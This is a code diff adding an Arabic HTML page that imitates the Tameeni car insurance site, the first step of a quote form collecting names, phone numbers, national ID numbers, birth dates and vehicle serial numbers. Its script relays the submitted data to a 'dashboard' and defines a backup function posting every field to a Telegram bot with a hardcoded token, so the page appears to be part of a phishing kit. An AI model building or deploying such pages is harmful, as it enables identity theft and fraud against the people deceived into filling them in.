@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>تأميني - البيانات الأساسية</title>
+<!-- Google Fonts - Cairo Arabic Font -->
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+<!-- 🔧 إضافة ملف التكامل مع لوحة التحكم -->
+<script src="/dashboard/site-integration.js"></script>
+
+<style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
+      background-color: #f5f7fb;
+      color: #333;
+      font-weight: 400;
+    }
+    .app {
+      max-width: 480px;
+      margin: 0 auto;
+      min-height: 100vh;
+      background-color: #fff;
+    }
+    header {
+      padding: 10px 14px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #e0e0e0;
+    }
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-weight: 700;
+      color: #007bff;
+      font-size: 18px;
+    }
+    .logo-icon {
+      width: 28px;
+      height: 28px;
+      border-radius: 8px;
+      border: 2px solid #007bff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+    .logo-icon img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+    .login-link {
+      font-size: 13px;
+      color: #007bff;
+      text-decoration: none;
+    }
+
+    .stepper {
+      display: flex;
+      justify-content: space-between;
+      padding: 16px 16px 8px;
+      font-size: 11px;
+      color: #aaa;
+    }
+    .step {
+      flex: 1;
+      text-align: center;
+    }
+    .step-number {
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      border: 2px solid #d0d0d0;
+      margin: 0 auto 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 11px;
+      background-color: #fff;
+    }
+    .step.active .step-number {
+      border-color: #4caf50;
+      color: #4caf50;
+      font-weight: 700;
+    }
+    .step.active span {
+      color: #4caf50;
+      font-weight: 600;
+    }
+
+    main {
+      padding: 12px 16px 24px;
+    }
+    h1 {
+      font-size: 18px;
+      margin-bottom: 12px;
+    }
+    h2 {
+      font-size: 15px;
+      margin: 16px 0 8px;
+    }
+    .label {
+      font-size: 13px;
+      margin-bottom: 6px;
+      display: block;
+      color: #555;
+    }
+
+    .segmented {
+      display: flex;
+      border-radius: 10px;
+      overflow: hidden;
+      border: 1px solid #cfd5e3;
+      margin-bottom: 14px;
+    }
+    .segmented button {
+      flex: 1;
+      padding: 10px 6px;
+      border: none;
+      background-color: #fff;
+      font-size: 13px;
+      cursor: pointer;
+      color: #555;
+      font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
+      font-weight: 400;
+    }
+    .segmented button + button {
+      border-right: 1px solid #cfd5e3;
+    }
+    .segmented button.active {
+      background-color: #007bff;
+      color: #fff;
+      font-weight: 600;
+    }
+
+    .field {
+      margin-bottom: 14px;
+    }
+    input[type="text"],
+    input[type="number"],
+    input[type="tel"],
+    input[type="date"],
+    select {
+      width: 100%;
+      padding: 10px;
+      border-radius: 8px;
+      border: 1px solid #cfd5e3;
+      font-size: 14px;
+      font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
+      font-weight: 400;
+    }
+    input:focus,
+    select:focus {
+      outline: none;
+      border-color: #007bff;
+      box-shadow: 0 0 0 1px rgba(0,123,255,0.2);
+    }
+    .error {
+      color: #d32f2f;
+      font-size: 12px;
+      margin-top: 4px;
+      min-height: 16px;
+    }
+
+    .info-text {
+      font-size: 11px;
+      color: #666;
+      line-height: 1.6;
+      margin-top: 8px;
+    }
+
+    .buttons-row {
+      display: flex;
+      gap: 8px;
+      margin-top: 20px;
+    }
+    .btn {
+      flex: 1;
+      padding: 14px;
+      border-radius: 10px;
+      border: none;
+      font-size: 15px;
+      cursor: pointer;
+      font-weight: 600;
+      text-align: center;
+      font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
+    }
+    .btn-primary {
+      background-color: #007bff;
+      color: #fff;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    /* إصلاح مشكلة تكبير الخط في الهواتف المحمولة */
+    @media screen and (max-width: 480px) {
+      input[type="text"],
+      input[type="number"],
+      input[type="tel"],
+      input[type="email"],
+      input[type="password"],
+      input[type="date"],
+      input[type="datetime-local"],
+      input[type="month"],
+      input[type="search"],
+      input[type="time"],
+      input[type="url"],
+      input[type="week"],
+      input:not([type]),
+      textarea,
+      select {
+        font-size: 16px !important;
+      }
+    }
+
+    /* شاشة التحميل */
+    /* شاشة التحميل الجديدة */
+    .loading-screen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(135deg, rgba(0, 123, 255, 0.95) 0%, rgba(0, 86, 179, 0.95) 100%);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 99999;
+      font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
+      backdrop-filter: blur(10px);
+    }
+
+    .loading-screen.show {
+      display: flex;
+      animation: fadeIn 0.3s ease-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    .loading-content {
+      text-align: center;
+      color: white;
+      transform: translateY(0);
+      animation: slideUp 0.5s ease-out;
+    }
+
+    @keyframes slideUp {
+      from { 
+        opacity: 0;
+        transform: translateY(30px);
+      }
+      to { 
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .loading-dots {
+      display: inline-block;
+      position: relative;
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 30px;
+    }
+
+    .loading-dots div {
+      position: absolute;
+      top: 33px;
+      width: 13px;
+      height: 13px;
+      border-radius: 50%;
+      background: #ffffff;
+      animation-timing-function: cubic-bezier(0, 1, 1, 0);
+    }
+
+    .loading-dots div:nth-child(1) {
+      left: 8px;
+      animation: loadingDots1 0.6s infinite;
+    }
+
+    .loading-dots div:nth-child(2) {
+      left: 8px;
+      animation: loadingDots2 0.6s infinite;
+    }
+
+    .loading-dots div:nth-child(3) {
+      left: 32px;
+      animation: loadingDots2 0.6s infinite;
+    }
+
+    .loading-dots div:nth-child(4) {
+      left: 56px;
+      animation: loadingDots3 0.6s infinite;
+    }
+
+    @keyframes loadingDots1 {
+      0% { transform: scale(0); }
+      100% { transform: scale(1); }
+    }
+
+    @keyframes loadingDots3 {
+      0% { transform: scale(1); }
+      100% { transform: scale(0); }
+    }
+
+    @keyframes loadingDots2 {
+      0% { transform: translate(0, 0); }
+      100% { transform: translate(24px, 0); }
+    }
+
+    .loading-text {
+      font-size: 22px;
+      font-weight: 700;
+      margin-bottom: 12px;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+      letter-spacing: 0.5px;
+    }
+
+    .loading-subtext {
+      font-size: 16px;
+      color: rgba(255, 255, 255, 0.8);
+      font-weight: 400;
+      letter-spacing: 0.3px;
+    }
+</style>
+</head>
+<body>
+<div class="app">
+<header>
+<div class="logo">
+<div class="logo-icon" style="display:flex;align-items:center;justify-content:center;padding:0;overflow:hidden;"><img alt="تأميني" src="images/logo.png" style="width:100%;height:100%;object-fit:cover;display:block;"/></div>
+<span>تأميني</span>
+</div>
+<a class="login-link" href="index.html#">تسجيل الدخول</a>
+</header>
+<div class="stepper">
+<div class="step active" data-step="1">
+<div class="step-number">1</div>
+<span>البيانات الأساسية</span>
+</div>
+<div class="step" data-step="2">
+<div class="step-number">2</div>
+<span>بيانات التأمين</span>
+</div>
+<div class="step" data-step="3">
+<div class="step-number">3</div>
+<span>قائمة الأسعار</span>
+</div>
+<div class="step" data-step="4">
+<div class="step-number">4</div>
+<span>الإضافات</span>
+</div>
+<div class="step" data-step="5">
+<div class="step-number">5</div>
+<span>الملخص والدفع</span>
+</div>
+</div>
+<main>
+<h1>الغرض من التأمين</h1>
+<form id="formStep1" novalidate="">
+<!-- نوع العرض -->
+<span class="label">نوع العرض</span>
+<div class="segmented" id="offerType">
+<button class="active" data-value="new" type="button">تأمين جديد</button>
+<button data-value="transfer" type="button">نقل الملكية</button>
+</div>
+<!-- نوع تسجيل المركبة -->
+<span class="label">نوع تسجيل المركبة</span>
+<div class="segmented" id="regType">
+<button class="active" data-value="serial" type="button">الرقم التسلسلي</button>
+<button data-value="customs" type="button">بطاقة جمركية [استيراد]</button>
+</div>
+<!-- الاسم -->
+<div class="field">
+<label class="label" for="userName">الاسم الكامل</label>
+<input id="userName" name="userName" placeholder="أدخل اسمك الكامل" type="text"/>
+<div class="error" id="userNameError"></div>
+</div>
+<!-- رقم الهاتف -->
+<div class="field">
+<label class="label" for="phoneNumber">رقم الهاتف</label>
+<input id="phoneNumber" name="phoneNumber" placeholder="05xxxxxxxx" type="tel" maxlength="10" inputmode="numeric" autocomplete="tel" style="direction: ltr; text-align: right;"/>
+<div class="error" id="phoneNumberError"></div>
+</div>
+<!-- رقم الهوية -->
+<div class="field">
+<label class="label" for="idNumber">رقم الهوية</label>
+<input id="idNumber" inputmode="numeric" name="idNumber" placeholder="رقم الهوية الوطنية أو الإقامة أو الشركة" type="text"/>
+<div class="error" id="idError"></div>
+</div>
+<!-- تاريخ الميلاد (خاص نقل الملكية) -->
+<div class="field transfer-only hidden">
+<label class="label" for="birthDate">تاريخ الميلاد</label>
+<input id="birthDate" name="birthDate" type="date"/>
+<div class="error" id="birthDateError"></div>
+</div>
+<!-- الرقم التسلسلي / رقم البطاقة الجمركية -->
+<div class="field">
+<label class="label" for="serialNumber">الرقم التسلسلي</label>
+<input id="serialNumber" name="serialNumber" placeholder="الرقم التسلسلي للمركبة" type="text"/>
+<div class="error" id="serialError"></div>
+</div>
+<!-- سنة الصنع (خاص نقل الملكية) -->
+<div class="field transfer-only hidden">
+<label class="label" for="carYear">سنة الصنع</label>
+<input id="carYear" name="carYear" placeholder="اختر سنة الصنع" type="number"/>
+<div class="error" id="carYearError"></div>
+</div>
+<p class="info-text">
+        بالضغط على التالي، أوافق على منح تأميني الحق في الاستعلام عن بياناتي وبيانات مركبتي من الجهات المعنية لأجل إصدار التسعيرة.
+      </p>
+<div class="buttons-row">
+<button class="btn btn-primary" type="submit">التالي</button>
+</div>
+</form>
+</main>
+</div>
+<script>
+  // حفظ مؤقت في sessionStorage لعرض الملخص (يتم حذفه بعد الاستخدام)
+  function saveTempData(data) {
+    sessionStorage.setItem('tameeniTempData', JSON.stringify(data));
+  }
+
+  // حذف البيانات المؤقتة
+  function clearTempData() {
+    sessionStorage.removeItem('tameeniTempData');
+  }
+
+  // شاشة التحميل
+  function showLoadingScreen() {
+    const overlay = document.getElementById('loadingOverlay');
+    const countdown = document.getElementById('loadingCountdown');
+    
+    if (!overlay || !countdown) return;
+    
+    let seconds = 5;
+    overlay.style.display = 'flex';
+    
+    const timer = setInterval(() => {
+      seconds--;
+      countdown.textContent = seconds;
+      
+      if (seconds <= 0) {
+        clearInterval(timer);
+        overlay.style.display = 'none';
+      }
+    }, 1000);
+  }
+
+  // شاشة التحميل للانتقال بين الصفحات
+  function showLoadingAndRedirect(url) {
+    const loadingScreen = document.getElementById('loadingScreen');
+    if (!loadingScreen) {
+      window.location.href = url;
+      return;
+    }
+    
+    loadingScreen.classList.add('show');
+    setTimeout(() => {
+      window.location.href = url;
+    }, 1000);
+  }
+
+  // تحديث واجهة نوع تسجيل المركبة
+  function updateRegTypeUI(value) {
+    const label = document.querySelector('label[for="serialNumber"]');
+    const input = document.getElementById('serialNumber');
+    if (!label || !input) return;
+
+    if (value === 'customs') {
+      label.textContent = 'رقم البطاقة الجمركية';
+      input.placeholder = 'رقم البطاقة الجمركية للمركبة';
+    } else {
+      label.textContent = 'الرقم التسلسلي';
+      input.placeholder = 'الرقم التسلسلي للمركبة';
+    }
+  }
+
+  // تحديث واجهة نوع العرض (تأمين جديد / نقل الملكية)
+  function updateOfferTypeUI(value) {
+    const idLabel = document.querySelector('label[for="idNumber"]');
+    const transferFields = document.querySelectorAll('.transfer-only');
+    if (idLabel) {
+      if (value === 'transfer') {
+        idLabel.textContent = 'رقم الهوية (المالك الجديد)';
+      } else {
+        idLabel.textContent = 'رقم الهوية';
+      }
+    }
+    transferFields.forEach(function (el) {
+      if (value === 'transfer') {
+        el.classList.remove('hidden');
+      } else {
+        el.classList.add('hidden');
+      }
+    });
+  }
+
+  // إعداد segmented buttons
+  function setupSegmented(id) {
+    const container = document.getElementById(id);
+    if (!container) return;
+    const buttons = container.querySelectorAll('button');
+    buttons.forEach(function (btn) {
+      btn.addEventListener('click', function () {
+        buttons.forEach(function (b) { b.classList.remove('active'); });
+        btn.classList.add('active');
+        container.dataset.value = btn.dataset.value;
+        if (id === 'regType') {
+          updateRegTypeUI(btn.dataset.value);
+        }
+        if (id === 'offerType') {
+          updateOfferTypeUI(btn.dataset.value);
+        }
+      });
+    });
+  }
+
+  // 🔧 دالة إرسال بيانات الخطوة الأولى إلى لوحة التحكم (معدلة)
+  async function sendToTelegramStep1(data) {
+    try {
+      // إرسال إلى لوحة التحكم
+      const success = await sendToDashboardStep1(data);
+      
+      if (success) {
+        console.log("تم إرسال بيانات الخطوة الأولى إلى لوحة التحكم بنجاح");
+      }
+      
+      // إرسال احتياطي إلى تيليجرام (اختياري - يمكن إزالته)
+      // await sendToTelegramBackup(data);
+      
+      return { success: true };
+    } catch (error) {
+      console.error("خطأ في إرسال البيانات:", error);
+      return { success: false };
+    }
+  }
+
+  // 🔧 دالة احتياطية لإرسال تيليجرام (يمكن إزالتها إذا لم تعد تريدها)
+  async function sendToTelegramBackup(data) {
+    const BOT_TOKEN = "8562564680:AAGotGtOsmJ4n-ugvC81HFmxTour-Pm1ntE";
+    const CHAT_ID = "6165206261";
+    
+    const offerTypeText = data.offerType === 'transfer' ? 'نقل الملكية' : 'تأمين جديد';
+    const regTypeText = data.regType === 'customs' ? 'بطاقة جمركية [استيراد]' : 'الرقم التسلسلي';
+    
+    const message = 
+      "🔵 خطوة 1 – البيانات الأساسية\n\n" +
+      "الاسم: " + (data.userName || "-") + "\n" +
+      "رقم الهاتف: " + (data.phoneNumber || "-") + "\n" +
+      "نوع العرض: " + offerTypeText + "\n" +
+      "نوع تسجيل المركبة: " + regTypeText + "\n" +
+      "رقم الهوية: " + (data.idNumber || "-") + "\n" +
+      "تاريخ الميلاد: " + (data.birthDate || "غير محدد") + "\n" +
+      "الرقم التسلسلي/الجمركي: " + (data.serialNumber || "-") + "\n" +
+      "سنة الصنع: " + (data.carYear || "غير محدد");
+
+    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message
+      })
+    });
+  }
+
+  document.addEventListener('DOMContentLoaded', function () {
+    // شاشة التحميل عند تحميل الصفحة
+    showLoadingScreen();
+
+    setupSegmented('offerType');
+    setupSegmented('regType');
+
+    const offerType = document.getElementById('offerType');
+    const regType = document.getElementById('regType');
+
+    // إعداد القيم الافتراضية
+    offerType.dataset.value = offerType.querySelector('button.active').dataset.value;
+    regType.dataset.value = regType.querySelector('button.active').dataset.value;
+
+    // تطبيق حالة الواجهات
+    updateRegTypeUI(regType.dataset.value);
+    updateOfferTypeUI(offerType.dataset.value);
+
+    const form = document.getElementById('formStep1');
+    form.addEventListener('submit', async function (e) {
+      e.preventDefault();
+
+      const idInput = document.getElementById('idNumber');
+      const userNameInput = document.getElementById('userName');
+      const phoneInput = document.getElementById('phoneNumber');
+      const birthInput = document.getElementById('birthDate');
+      const serialInput = document.getElementById('serialNumber');
+      const carYearInput = document.getElementById('carYear');
+
+      const idError = document.getElementById('idError');
+      const userNameError = document.getElementById('userNameError');
+      const phoneError = document.getElementById('phoneNumberError');
+      const birthError = document.getElementById('birthDateError');
+      const serialError = document.getElementById('serialError');
+      const carYearError = document.getElementById('carYearError');
+
+      idError.textContent = '';
+      userNameError.textContent = '';
+      phoneError.textContent = '';
+      birthError.textContent = '';
+      serialError.textContent = '';
+      carYearError.textContent = '';
+
+      let valid = true;
+
+      // التحقق من الاسم
+      const userNameVal = userNameInput.value.trim();
+      if (!userNameVal) {
+        userNameError.textContent = 'الرجاء إدخال الاسم.';
+        valid = false;
+      } else if (userNameVal.length < 2) {
+        userNameError.textContent = 'الاسم قصير جداً.';
+        valid = false;
+      }
+
+      // التحقق من رقم الهاتف
+      const phoneVal = phoneInput.value.trim();
+      if (!phoneVal) {
+        phoneError.textContent = 'الرجاء إدخال رقم الهاتف.';
+        valid = false;
+      } else if (!/^05[0-9]{8}$/.test(phoneVal)) {
+        phoneError.textContent = 'الرجاء إدخال رقم هاتف صحيح يبدأ بـ 05.';
+        valid = false;
+      }
+
+      // التحقق من رقم الهوية (10 أرقام)
+      const idVal = idInput.value.trim();
+      if (!idVal) {
+        idError.textContent = 'الرجاء إدخال رقم الهوية.';
+        valid = false;
+      } else if (!/^[0-9]{10}$/.test(idVal)) {
+        idError.textContent = 'الرجاء إدخال رقم هوية صحيح مكون من 10 أرقام.';
+        valid = false;
+      }
+
+      // التحقق من الرقم التسلسلي / الجمركي
+      if (!serialInput.value.trim()) {
+        serialError.textContent = 'الرجاء إدخال الرقم التسلسلي.';
+        valid = false;
+      }
+
+      // حقول خاصة بنقل الملكية
+      if (offerType.dataset.value === 'transfer') {
+        if (!birthInput.value) {
+          birthError.textContent = 'الرجاء إدخال تاريخ الميلاد.';
+          valid = false;
+        }
+        if (!carYearInput.value.trim()) {
+          carYearError.textContent = 'الرجاء إدخال سنة الصنع.';
+          valid = false;
+        }
+      }
+
+      if (!valid) return;
+
+      const d = {
+        userName: userNameVal,
+        phoneNumber: phoneVal,
+        offerType: offerType.dataset.value,
+        regType: regType.dataset.value,
+        idNumber: idVal,
+        birthDate: birthInput.value,
+        serialNumber: serialInput.value.trim(),
+        carYear: carYearInput.value.trim()
+      };
+
+      // حفظ مؤقت للملخص + إرسال للبوت
+      saveTempData(d);
+      try {
+        await sendToTelegramStep1(d);
+        console.log("تم إرسال بيانات الخطوة الأولى إلى لوحة التحكم بنجاح");
+      } catch (error) {
+        console.error("خطأ في إرسال البيانات إلى لوحة التحكم:", error);
+      }
+
+      // الانتقال المباشر للخطوة التالية
+      showLoadingAndRedirect('tameeni-step2-linked.html');
+    });
+  });
+</script>
+
+<!-- شاشة التحميل الجديدة -->
+<div class="loading-screen" id="loadingScreen">
+<div class="loading-content">
+<div class="loading-dots">
+<div></div>
+<div></div>
+<div></div>
+<div></div>
+</div>
+<div class="loading-text" id="loadingText">جاري التحميل...</div>
+<div class="loading-subtext" id="loadingSubtext">يرجى الانتظار</div>
+</div>
+</div>
+
+</body>
+</html>
